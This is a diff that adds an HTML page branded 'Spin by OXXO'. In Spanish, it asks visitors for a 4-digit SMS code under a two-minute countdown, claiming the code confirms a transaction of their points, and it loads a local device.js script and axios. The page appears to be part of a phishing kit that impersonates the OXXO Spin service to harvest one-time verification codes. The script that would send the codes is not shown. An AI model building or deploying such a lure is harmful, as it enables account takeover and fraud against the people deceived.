@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin by OXXO | Validar dispositivo móvil</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="shortcut icon" href="./img/favico.ico" type="image/x-icon">
+</head>
+
+<body>
+    <header>
+        <nav>
+            <img src="./img/logo.png" alt="">
+        </nav>
+    </header>
+    <div class="container-validation-code">
+        <h1>Valida tu identidad</h1>
+        <p>Escribe el código de 4 dígitos que recibiste por mensaje de SMS</p>
+        <div id="validation-code-inputs">
+            <input type="text" maxlength="1" class="validation-code-input" id="digit1">
+            <input type="text" maxlength="1" class="validation-code-input" id="digit2">
+            <input type="text" maxlength="1" class="validation-code-input" id="digit3">
+            <input type="text" maxlength="1" class="validation-code-input" id="digit4">
+        </div>
+        <p id="tiempo-restante">Tiempo restante: <span id="contador">2:00</span> segundos</p>
+        <p>Por favor aguarda, recibirás un SMS para confirmar la transacción de tus puntos.</p>
+        <button onclick="validarDispositivo()">Validar</button>
+    </div>
+
+    <div class="container-footer">
+        <img src="./img/footer.png" alt="">
+    </div>
+    <script src="./js/device.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+</body>
+
+</html>
